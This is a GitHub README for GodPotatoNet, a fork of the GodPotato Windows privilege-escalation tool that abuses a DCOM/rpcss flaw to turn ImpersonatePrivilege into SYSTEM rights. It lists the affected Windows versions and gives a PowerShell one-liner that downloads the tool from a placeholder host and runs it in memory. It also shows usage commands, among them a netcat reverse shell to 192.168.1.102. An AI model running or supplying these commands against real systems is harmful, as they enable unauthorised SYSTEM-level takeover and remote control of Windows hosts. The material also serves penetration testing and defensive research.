# GodPotatoNet

> [!IMPORTANT]  
> This project is now DEPRECRATED, and has been succeeded by my [SigmaPotato](https://github.comt/tylerdotrar/SigmaPotato) project.

This fork of [GodPotato](https://github.com/BeichenDream/GodPotato) aims to expand upon the usability of BeichenDream's hard work.

![HelpMessage](https://cdn.discordapp.com/attachments/855920119292362802/1110988288031993917/image.png)

The predominant functionality I wanted to add was support for C# reflection, while refining some general usage.

```powershell
# C# Reflection in PowerShell
[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData("http(s)://<ip_addr>/GodPotatoNet.exe"))
[GodPotatoNet.Program]::Main(@('-cmd','<command>'))
```

**Current Status:**
- Initial support for C# reflection. (``v1.0.0``)
- Refined help message. (``v1.0.0``)
- Refine argument input so calling from memory is more intuitive. (``WIP``)
- Fix (assumptive) thread handling issue present ONLY when calling from memory. (``WIP``)

**Known Bugs:**
- When called from memory, privilege escalation is only successful on the first execution -- every following attempt fails to impersonate the security context token.  Currently the only fix is to load ``GodPotatoNet`` into a new terminal session.

**Affected Windows Versions:**
- Windows Server 2012 - Windows Server 2022
- Windows 8 - Windows 11


### Original GodPotato
---

Based on the history of Potato privilege escalation for 6 years, from the beginning of RottenPotato to the end of JuicyPotatoNG, I discovered a new technology by researching DCOM, which enables privilege escalation in Windows 2012 - Windows 2022, now as long as you have "ImpersonatePrivilege" permission. Then you are "NT AUTHORITY\SYSTEM", usually WEB services and database services have "ImpersonatePrivilege" permissions.


Potato privilege escalation is usually used when we obtain WEB/database privileges. We can elevate a service user with low privileges to "NT AUTHORITY\SYSTEM" privileges.
However, the historical Potato has no way to run on the latest Windows system. When I was researching DCOM, I found a new method that can perform privilege escalation. There are some defects in rpcss when dealing with oxid, and rpcss is a service that must be opened by the system. , so it can run on almost any Windows OS, I named it GodPotato

**Examples:**

Use the program's built-in Clsid for privilege escalation and execute a simple command

```
GodPotato -cmd "cmd /c whoami"
```

![](images/1.png)

Customize Clsid and execute commands

```
GodPotato -cmd "cmd /c whoami"
```

![](images/2.png)

Execute reverse shell commands

```
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
### Thanks

- zcgonvh
- skay

### License

[Apache License 2.0](/LICENSE)
